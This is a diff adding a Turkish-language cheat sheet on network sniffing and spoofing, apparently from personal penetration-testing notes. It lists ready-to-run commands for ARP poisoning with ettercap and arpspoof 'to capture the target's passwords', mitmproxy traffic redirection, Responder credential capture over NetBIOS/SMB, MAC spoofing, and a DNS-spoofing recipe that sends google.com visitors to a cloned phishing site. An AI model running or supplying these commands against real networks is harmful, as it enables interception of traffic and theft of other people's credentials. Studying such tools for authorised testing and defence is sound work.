@@ -1,0 +1,100 @@
+## 08. SNIFFING & SPOOFING (KOKLAMA VE SIZDIRMA ARAÇLARI):
+
+### Ettercap :
+    Ağı dinleme ve yönlendirme yapmaya yarar.
+    
+    Hedefteki cihaza saldırıp şifreleri ele geçirmek için :
+    `ettercap -Tq -M arp:remote -i wlan0 /modem_ip//   /hedef_ip//`
+    
+    Site yönlendirme yapmak için:
+    `leafpad /etc/ettercap/etter.dns`	//site yönlendirmelerini düzenle
+    `ettercap -Tq -M arp:remote -P dns_spoof -i eth0 /// ///`
+	//plug-ini dns_spoof yazan yere de yazabiliriz yada programı çalıştırıp p ye basarak seçebiliriz.
+
+### Ferret , Hamster :
+    Ferret : Ağ üzerine kullanıcıların girdikleri web sitelerini kaydeder.
+    “ferret -i eth0” -> Bilgi toplamaya başlar.
+    
+    Hamster : Ferret’ten gelen bilgileri görsel olarak düzenli şekilde görülmesini sağlar.
+
+### Macchanger :
+    Mac adresini değiştirmeye yarar. 
+    “ifconfig eth0 down”     ->     Önce ağ kartı devre dışı bırakılır.
+    “macchanger -r eth0”    ->     r parametresi rastgele mac adresi oluşturur.
+    “macchanger --mac 12:23:34:45:56:67 eth0”    ->      Elle mac girmek için.
+    “ifconfig eth0 up”          ->    Ağ kartı tekrar aktif edilir.
+    “macchanger --permanent eth0”     ->    İlk orjinal ayarına döndürür.
+    
+    Başka bir mac adres değiştirme yöntemi :
+    “ifconfig wlan0 down”
+	“ifconfig wlan0 hw ether 00:11:22:33:44:55”
+
+### Mitm Proxy :
+	Ağdaki kullanıcıların girdikleri web sitelerini analiz eder.
+    
+    Port yönlendirme için izin verme :
+	`echo 1 > /proc/sys/net/ipv4/ip_forward`  -> bu dosyadaki 0 değerini 1 yaptık.
+	
+	Port yönlendirme için :
+	`iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to -port 8080`  ->  80’den gelenleri 8080’e yönlendir.
+	
+	Arp yönlendirmesi (arpspoof):
+	`arpspoof -i eth0 -t hedef_ip_adresi  modem_ip_adresi`
+	`mitmproxy -T -p 8080`
+	
+### Arp Saldırısı :
+    Ağdaki Gateway aygıtının mac adresini kendi cihazımız olarak ayarlayıp, ağdaki diğer cihazların yönlendirmelerini kendi üzerimizden yapmak. Mıtm proxy ile aynı işlemler.
+    
+    Arp ile ağdaki cihazların keşfi;
+	“arping 192.168.0.1” => Modeme ping atar, mac adresini öğrenir.
+   
+    Ağda kimler var;
+	“arp-scan --localnet”
+	“arp-scan --localnet --interface=eth0(wlan0)”
+    
+    Port yönlendirme için izin verme :
+    “echo 1 > /proc/sys/net/ipv4/ip_forward”  -> bu dosyadaki 0 değerini 1 yaptık.
+    
+    Arp yönlendirmesi (arpspoof):
+    “arpspoof -i eth0 -t hedef_ip_adresi -r modem_ip_adresi”
+   
+    Hedef ip gateway’e gitmeye çalışırken bizim eth0 interface’imizden geçecek.
+    -r reverse ( Her iki taraf içinde zehirleme yapar tek komutta )
+
+
+### Responder :
+	Ağ üzerinde netbios’dan gelen istekleri izler. Ağda herhangi bir dosya paylaşımına ulaşılmak istendiğinde araya girerek kullanıcı adı ve şifreleri öğrenir. 
+   
+    `python Responder.py -i 192.168.42.131 -I eth0 -w -r -f`  komutu ile uygulamayı çalıştırıyoruz.
+
+    -i   : Ip adresimizi belirttik.
+    -I   : Ağ adaptörümüzü belirttik. ( eth0, gns33, wifi0 vs.)
+    -w   : WPAD Proxy sunucusunu başlatır. Default olarak kapalı gelir.
+    -r   : NetBIOS’un wredir sorgularına cevap verir
+    -f   : Makine parmak izlerini izlememizi sağlar.    
+
+#### Smb sign özelliğine bakma
+    “python /usr/share/responder/tools/Runfinger.py -i 192.168.1.1/24” yada
+    “responder-RunFinger -i 192.168.0.0/24”
+
+### Wireshark :
+	Ağ analizinde kullanılır. Ağ kartına tıklanarak dinlemeye başlanır.
+    Protokol adı contains “aranacak kelime ” = O protokol verileri içerisinde geçen aranan kelimenin olduğu satırları getirir.
+    File>Export Object ile dosyaları dışarı çıkart.
+
+### Tshark :
+    tshark -i eth0 -w dosya.pcap -f “tcp” -c 10 --capture-comment “yorum satırı”
+    i = interface
+    w= oluşturulacak dosya adı
+    f= protokol filtreleme
+    c= yakalanacak paket miktarı
+    r= okunacak dosya
+   
+### DNS Spoofing
+    Hedefe DNS yönlendirme yaptırarak istediğimiz adrese gitmesini sağlarız.
+    1.	Dns config dosyası oluştur. (dns.cfg)
+    192.168.1.15	*.google.com
+    (kendi ip’miz)
+    2.	Klon site yap. (Örnek : setolkit programıyla google kopyala.)
+    Oluşan klon siteye kendi ip mizin 80 portundan bakabiliriz.
+    3.	“dnsspoof -i eth0 -f /root/Desktop/dns.cfg”
